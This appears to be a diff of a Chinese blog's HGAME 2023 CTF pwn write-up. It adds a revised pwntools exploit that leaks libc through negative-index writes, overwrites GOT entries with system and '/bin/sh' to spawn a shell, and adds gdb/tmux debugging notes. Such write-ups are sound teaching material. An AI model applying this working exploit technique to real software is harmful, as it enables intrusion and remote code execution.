@@ -37,6 +37,11 @@
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153844803.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153925669.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230114153109502.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116195715458.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200235063.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200809156.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116200845999.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116201152048.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115211905558.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115212222119.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230115214426688.png">
@@ -46,7 +51,7 @@
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116112543060.png">
 <meta property="og:image" content="https://pa1r0t.github.io/images/image-20230116113635529.png">
 <meta property="article:published_time" content="2023-01-14T02:09:49.000Z">
-<meta property="article:modified_time" content="2023-01-16T03:41:04.813Z">
+<meta property="article:modified_time" content="2023-01-16T12:11:57.172Z">
 <meta property="article:author" content="Pa1r0t_9e">
 <meta name="twitter:card" content="&lt;twitter:card&gt;">
 <meta name="twitter:image" content="https://pa1r0t.github.io/2023/01/14/hgame2023/%3Ctwitter:image%3E">
@@ -188,7 +193,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -273,7 +278,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-01-16 11:41:04" itemprop="dateModified" datetime="2023-01-16T11:41:04+08:00">2023-01-16</time>
+      <time title="修改时间：2023-01-16 20:11:57" itemprop="dateModified" datetime="2023-01-16T20:11:57+08:00">2023-01-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -342,16 +347,39 @@
 <li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li>
 </ol>
 <p>exp：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31940</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">res_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(res_addr))</span><br><span class="line">base_addr = res_addr - <span class="number">0x8ba41</span></span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30536)</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>,vuln_addr)</span><br><span class="line">b()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">base_addr = setbuf_addr - libc_setbuf_addr</span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p>
 <p>下面把d0换成41就行，41就是我们写进去的’A’</p>
 <p><img src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p>
 <p>如何这里减去总值：</p>
 <p><img src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p>
+<p>这里还有一种做法就是写入\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br></pre></td></tr></table></figure>
+
 <p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p>
 <p><img src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p>
+<p>这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数</p>
+<p>第二种做法就是用one_gadget查找libc中，执行binsh的指令</p>
+<p><img src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p>
+<p>这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的</p>
+<p>所以我们采用第一种方法</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch</p>
+<p>这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure>
+
+<p>将这个函数放置到我们想调试的地方</p>
+<p>效果：</p>
+<p><img src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p>
+<p>然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了</p>
+<p><img src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p>
+<p><img src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p>
+<p>这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了</p>
 <p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p>
+<p>结果：</p>
+<p><img src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p>
 <h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p><strong>CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出</strong></p>
 <p>将三个函数开头字母作为简称，也就是orw</p>
 <p>可以通过<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来判断是否添加沙箱，以及查看沙箱的规则</p>
@@ -513,6 +541,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2023/01/19/IDAPython/" rel="next" title="IDAPython">
+                  IDAPython <i class="fa fa-chevron-right"></i>
+                </a>
             </div>
           </div>
     </footer>
